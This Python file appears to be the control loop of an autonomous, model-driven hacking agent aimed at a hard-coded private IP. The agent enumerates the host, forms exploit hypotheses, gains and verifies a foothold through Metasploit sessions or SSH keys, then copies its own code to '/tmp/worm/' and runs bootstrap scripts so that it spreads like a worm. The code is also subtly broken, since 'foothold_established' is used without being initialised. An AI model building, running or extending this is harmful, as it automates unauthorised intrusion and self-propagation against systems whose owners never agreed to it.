from analysis import analyze
from planner import plan_next_actions
from executor import execute_action, run
from tool_normalizer import normalize_tool_output
from hypothesizer import generate_hypotheses
from progress import assess_progress
from memory import Campaign, Host
from reflector import evaluate_action_progress
from verify_foothold import verify_foothold, MSF_FOOTHOLD_TYPES
import tools
from tools.base import render_tools
from tools.registry import REGISTRY
from tools.msf_sessions import run_session_command, parse_session_output
import networkx as nx
import os, pickle

FOOTHOLD_EXEC_MAP = {
    "ssh_key": "ssh_exec",
    "ssh_key_drop": "ssh_exec",
    "meterpreter": "msf_sessions",
    "msf_shell": "msf_sessions",
    # "webshell": "curl_webshell_exec",
    # "reverse_shell": "shell_session_exec",
}

def select_exec_tools(host):
    if not host.foothold:
        return []
    name = FOOTHOLD_EXEC_MAP.get(host.foothold.get("type"))
    return [REGISTRY[name]] if name and name in REGISTRY else []

test_host = Host(
    id="host1",
    services={},
    facts={},
    state="unknown",
    os=None,
    hostname=None,
    hypotheses=[],
    ip = "192.168.1.246",
    foothold=False,
    vulnerabilities={},
)

# Define memory
campaign = Campaign(
    graph=nx.DiGraph(),
    hosts=[test_host],
)

CHECKPOINT_PATH = "campaign_checkpoint.pkl"

def save_checkpoint(state):
    tmp = CHECKPOINT_PATH + ".tmp"
    with open(tmp, "wb") as f:
        pickle.dump(state, f)
    os.replace(tmp, CHECKPOINT_PATH)

# Discover network
pass

# Enumerate host code
phase = "enum_host"

def merge(dst, src):
    for k, v in src.items():
        if (
            k in dst
            and isinstance(dst[k], dict)
            and isinstance(v, dict)
        ):
            merge(dst[k], v)
        else:
            dst[k] = v

def apply_update(host, update):
    merge(host.facts, update.get("facts", {}))
    merge(host.services, update.get("services", {}))
    for edge in update.get("new_edges", []):
        if "from" not in edge or "to" not in edge:
            continue
        campaign.graph.add_edge(edge["from"], edge["to"], type=edge.get("type", ""))
    if "vulnerabilities" in update:
        merge(host.vulnerabilities, update["vulnerabilities"])

def upload_to_host(host, local_path, remote_path):
    foothold_type = host.foothold.get("type")
    if foothold_type in MSF_FOOTHOLD_TYPES:
        print("[*] Skipping file upload — MSF session footholds use msf_sessions for file ops.")
        return {"code": 0, "stdout": "skipped", "stderr": ""}

    tool = REGISTRY["ssh_put"]
    f = host.foothold["details"]
    argv = tool.build_command({
        "target_ip": host.ip,
        "user": f["user"],
        "key_path": f["local_key_path"],
        "local_path": local_path,
        "remote_path": remote_path,
        "remote_os": "windows" if host.os == "windows" else "unix",
    })
    return run(argv, timeout=180)

COMMANDS = {
    "windows": ["./bootstrap.cmd"],
    "linux": ["./bootstrap.sh"],
    "mac": ["./bootstrap.sh"],
}

def detect_os(exec_fn) -> str:
    r = exec_fn("uname -s")
    if r["code"] == 0:
        out = r["stdout"].strip()
        if out == "Darwin":
            return "mac"
        if out == "Linux":
            return "linux"
    r = exec_fn("echo %OS%")
    if "Windows_NT" in r["stdout"]:
        return "windows"
    return "unknown"

def make_exec_fn(host):
    foothold_type = host.foothold.get("type")

    if foothold_type in MSF_FOOTHOLD_TYPES:
        session_id = host.foothold["details"]["session_id"]

        def exec_fn(command):
            result = run_session_command(session_id, command, foothold_type)
            output = parse_session_output(result)
            return {
                "cmd": result.get("cmd"),
                "code": result.get("code", 1),
                "stdout": output,
                "stderr": result.get("stderr", ""),
            }

        return exec_fn

    tool = REGISTRY["ssh_exec"]
    f = host.foothold["details"]

    def exec_fn(command):
        argv = tool.build_command({
            "target_ip": host.ip,
            "user": f["user"],
            "key_path": f["local_key_path"],
            "command": command,
        })
        return run(argv, timeout=30)

    return exec_fn

def run_hardcoded(host):
    if not host.foothold:
        print("[-] No verified foothold; nothing to run.")
        return
    exec_fn = make_exec_fn(host)
    host.os = detect_os(exec_fn)
    print(f"[*] Detected OS: {host.os}")
    for c in COMMANDS.get(host.os, COMMANDS["linux"]):
        r = exec_fn(c)
        print(f"$ {c}  (exit {r['code']})\n{r['stdout']}{r['stderr']}")

RESUMABLE = True

def checkpoint():
    if RESUMABLE:
        save_checkpoint({
            "host": host, "phase": phase,
            "progress": progress, "actions_queue": actions_queue,
        })

for host in campaign.hosts:
    actions_queue = []
    resumed = False
    if RESUMABLE and os.path.exists(CHECKPOINT_PATH):
        with open(CHECKPOINT_PATH, "rb") as f:
            ckpt = pickle.load(f)
        host, phase = ckpt["host"], ckpt["phase"]
        progress, actions_queue = ckpt["progress"], ckpt["actions_queue"]
        resumed = bool(actions_queue)
        print(f"Resumed at progress={progress['progress']}, {len(actions_queue)} pending actions")
    else:
        progress = {"progress": "more_info_needed"}

    while progress["progress"] != "ready":
        if resumed:
            resumed = False
        else:
            analysis_result = analyze(host, campaign.graph)
            host.facts.update(analysis_result["facts"])
            plan = plan_next_actions(host, analysis_result["inferences"],
                                    analysis_result["signals"], None, None,
                                    render_tools(REGISTRY, "recon"), phase)
            print("Got plan:", plan)
            actions_queue = list(plan.get("Next Actions", []))
            checkpoint()

        normalized_result = None

        while actions_queue:
            step = actions_queue.pop(0)
            tool = REGISTRY[step["tool"]]

            print("Executing: ", step["action"])
            execution_info, raw = execute_action(step["action"], tool, host, search_tools=render_tools(REGISTRY, "search"))
            print("Execution info:", execution_info)

            if execution_info["ok"]:
                normalized_result = normalize_tool_output(tool, execution_info["result"], host, phase)
                apply_update(host, normalized_result)
                print("Normalized result:", normalized_result)
            else:
                normalized_result = {"error": execution_info.get("error", "unknown failure")}

            reflection = evaluate_action_progress(host, normalized_result, actions_queue, phase)
            print(f"Reflector Decision: {reflection['decision']} - {reflection['reason']}")

            if reflection["decision"] == "replan":
                break

            elif reflection["decision"] == "retry_previous":
                if execution_info["ok"]:
                    retried = reflection.get("modified_previous_action", step)
                    print(f"Re-queuing previous action: {retried['action']}")
                    actions_queue.insert(0, retried)
                else:
                    print("Skipping retry: previous action errored out")
                
            elif reflection["decision"] == "hypothesize":
                break 
            elif reflection["decision"] == "modify_and_continue":
                if "modified_next_action" in reflection and actions_queue:
                    print(f"Modifying next action: {reflection['modified_next_action']}")
                    actions_queue[0] = reflection["modified_next_action"]
                
            elif reflection["decision"] == "continue":
                pass

            checkpoint()

        analysis_result = analyze(host, campaign.graph)
        new_hypotheses = generate_hypotheses(host, analysis_result["inferences"], analysis_result["signals"])
        print("New hypotheses:", new_hypotheses)
        host.hypotheses.extend(new_hypotheses["Hypotheses"])
        progress = assess_progress(host.hypotheses, analysis_result["unknowns"], None, phase)

        actions_queue = []
        checkpoint()

    phase = "establish_foothold"
    progress = {"progress": "not_established"}
    
    MAX_OUTER_ITERATIONS = 10
    MAX_ACTIONS_PER_HYPOTHESIS = 25

    tried_hypothesis_ids = set()
    outer_iterations = 0

    while progress["progress"] != "established":
        outer_iterations += 1
        if outer_iterations > MAX_OUTER_ITERATIONS:
            print("[-] Maximum outer iterations reached; aborting.")
            break

        analysis_result = analyze(host, campaign.graph)
        hypotheses = [h for h in host.hypotheses 
                      if h["confidence"] > 0.7
                      and id(h) not in tried_hypothesis_ids
                      and not h.get("failed_attempts", False)]
        
        if not hypotheses:
            progress["progress"] = "exhausted"
            break

        foothold_tools = render_tools(REGISTRY, "foothold")
        search_tools = render_tools(REGISTRY, "search")

        for hypothesis in hypotheses:
            plan = plan_next_actions(host, analysis_result["inferences"], analysis_result["signals"],
                                    analysis_result["unknowns"], hypothesis, foothold_tools, phase)
            print("Got foothold plan:", plan)
            action_queue = list(plan.get("Next Actions", []))
            hypothesis_failed = False
            
            replan_context = None
            steps_taken = 0

            while action_queue:
                steps_taken += 1
                if steps_taken > MAX_ACTIONS_PER_HYPOTHESIS:
                    print("[-] Maximum actions per hypothesis reached; moving to next hypothesis.")
                    hypothesis_failed = True
                    break

                step = action_queue.pop(0)
                tool = REGISTRY[step["tool"]]

                execution_info, raw = execute_action(step["action"], tool, host, search_tools=search_tools)
                
                if execution_info["ok"]:
                    normalized_result = normalize_tool_output(tool, execution_info["result"], host, phase)
                    apply_update(host, normalized_result)
                else:
                    normalized_result = {"error": execution_info.get("error", "unknown failure"), "stderr": execution_info.get("error", "unknown failure"), "stdout": execution_info.get("error", "unknown failure"), "ok": False}
                
                claims = normalized_result.get("foothold_claims", [])

                if claims:
                    foothold_verified = False
                    for claim in claims:
                        host.foothold = claim 
                        
                        if verify_foothold(host):
                            progress = {"progress": "established"}
                            foothold_verified = True
                            break
                        else:
                            print(f"[-] Claim ({claim['type']}) failed verification.")
                    
                    if foothold_verified:
                        break
                    
                    replan_context = {
                        "decision": "replan",
                        "reason": "Exploit output claimed access, but verification failed (false positive).",
                        "failed_claims": claims,
                    }

                    reflection = replan_context

                else:
                    reflection = evaluate_action_progress(host, normalized_result, action_queue, phase)
                
                decision = reflection.get("decision", "continue")
                if decision == "replan":
                    new_plan = plan_next_actions(host, analysis_result["inferences"], analysis_result["signals"],
                                            analysis_result["unknowns"], hypothesis, foothold_tools, phase, prior_failure=reflection)
                    new_actions = list(new_plan.get("Next Actions", []))
                    if not new_actions:
                        print("[-] Replan yielded no new actions; marking hypothesis as failed.")
                        hypothesis_failed = True
                        break
                    
                    action_queue = new_actions
                    replan_context = None
                    continue
                elif decision == "attempt_verify":
                    if host.foothold is not None and verify_foothold(host):
                        progress = {"progress": "established"}
                        foothold_established = True
                        break
                elif decision == "continue":
                    pass
                else:
                    print("Unhandled reflector decision:", decision)
            
            if foothold_established:
                break

            if not hypothesis_failed:
                if host.foothold is not None and verify_foothold(host):
                    progress = {"progress": "established"}
                    break
            
            if progress["progress"] == "established":
                break

    if host.foothold:
        upload_to_host(host, ".", "/tmp/worm/")
        run_hardcoded(host)